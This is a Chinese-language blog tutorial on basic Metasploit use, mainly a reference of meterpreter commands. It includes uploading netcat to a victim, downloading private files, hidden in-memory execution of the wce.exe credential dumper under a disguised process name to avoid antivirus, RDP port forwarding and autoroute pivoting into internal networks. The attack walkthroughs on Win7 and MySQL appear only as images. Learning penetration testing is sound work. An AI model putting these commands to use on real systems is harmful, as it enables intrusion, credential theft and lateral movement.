---
layout: post
title:  "Metasploit 渗透测试框架的基本使用"
date:   2021-03-06
categories: 网络安全
tags: msf使用
---

* content
{:toc}
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094443161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
##  msf框架
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094502808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094519883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
##  msf基本命令
**1.基本命令**

```bash
help# 查看Meterpreter帮助
background#返回，把meterpreter后台挂起
bgkill# 杀死一个背景 meterpreter 脚本
bglist#提供所有正在运行的后台脚本的列表
bgrun#作为一个后台线程运行脚本
channel#显示活动频道
sessions -i number # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用
sesssions -k  number #与会话进行交互
close# 关闭通道
exit# 终止 meterpreter 会话
quit# 终止 meterpreter 会话
interact id #切换进一个信道
run#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等
irb# 进入 Ruby 脚本模式
read# 从通道读取数据
write# 将数据写入到一个通道
run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本
use# 加载 meterpreter 的扩展
load/use#加载模块
Resource#执行一个已有的rc脚本
```
**2.文件系统命令**
```bash
del c:\boot.ini #删除指定的文件
upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\\windows\\system32\
download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\"ProgramFiles"\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/
edit c:\boot.ini  # 编辑文件
getlwd#打印本地目录
lcd#更改本地目录
ls#列出在当前目录中的文件列表
lpwd#打印本地目录
cd c:\\ #进入目录文件下
rm file #删除文件
rmdir#受害者系统上删除目录
search -d d:\\www -f web.config #search 文件，如search  -d c:\\  -f*.doc
meterpreter > search -f autoexec.bat  #搜索文件
meterpreter > search -f sea*.bat c:\\xamp\\
enumdesktops     #用户登录数
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210307141420442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
这样太明显，如果希望隐藏后台执行，加参数-H
```bash
execute  -H -f notepad.exe
```
再看一个，我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上命令：
```bash
execute  -H -i -f cmd.exe
```
这达到的效果就跟使用shell命令一样了
再来一个，在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。
```bash
execute  -H -m -d notepad.exe-f  wce.exe -a "-o wce.txt"
-d 在目标主机执行时显示的进程名称（用以伪装）
-m 直接从内存中执行
 "-o wce.txt"是wce.exe的运行参数
 ```

**3.网络命令**
```bash
ipconfig/ifconfig#显示网络接口的关键信息，包括 IP 地址
portfwd -h
用法：portfwd [-h] [add | delete | list | flush] [args]
选项：
    -L <opt>要监听的本地主机（可选）
    -h帮助横幅
    -l <opt>要监听的本地端口
    -p <opt>连接到的远程端口
    -r <opt>要连接到的远程主机
portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,把目标机3389转到本机4444
netstat -an | grep“4444"  #查看指定端口开放情况
rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #使用rdesktop来连接桌面，-u 用户名 -p 密码
rdesktop 127.1.1.0:4444 #需要输入用户名和密码远程连接
route#查看或修改受害者路由表
route add 192.168.1.0 255.255.255.0 1 #添加动态路由
route print #路由表输出
runget_local_subnets #目标主机的内网IP段情况
Arp       #看ARP缓冲表
Getproxy     #获取代理
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210307141942542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210307142041694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
大多时候我们获取到的meterpreter shell处于内网，而我们需要代理到目标内网环境中，扫描其内网服务器。这时可以使用route功能，添加一条通向目标服务器内网的路由。

查看shell网络环境：

meterpreter>run get_local_subnets

添加一条通向目标服务器内网的路由

meterpreter>run autoroute -s 100.0.0.0/8   #(根据目标内网网络而定)

查看路由设置：

meterpreter>run autoroute –p

一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf>，查看下外面的路由情况。

route print

如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。

msf>route add 10.0.0.0 255.0.0.0 1

说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030609480862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094827566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094856583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094914642.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094936216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306094952551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095006769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030609502037.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
###  模块相关的命令use的使用方法
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095033285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095046711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095108265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095121342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095142190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
###  使用show命令查看模块的相关信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030609523646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095430583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
#  使用msf渗透攻击Win7主机并远程执行命令
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030609544657.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095455820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095506720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095522139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095544162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095601806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095617101.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095629267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095642638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095658513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095711678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095736444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095748823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095800191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
##  使用 msf扫描靶机上mysql服务的空密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095821355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095854329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095934564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095943726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306095952945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306100006456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306100018208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021030610003881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306100057165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/202103061001071.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210306100122544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwOTY1MTc3,size_16,color_FFFFFF,t_70)



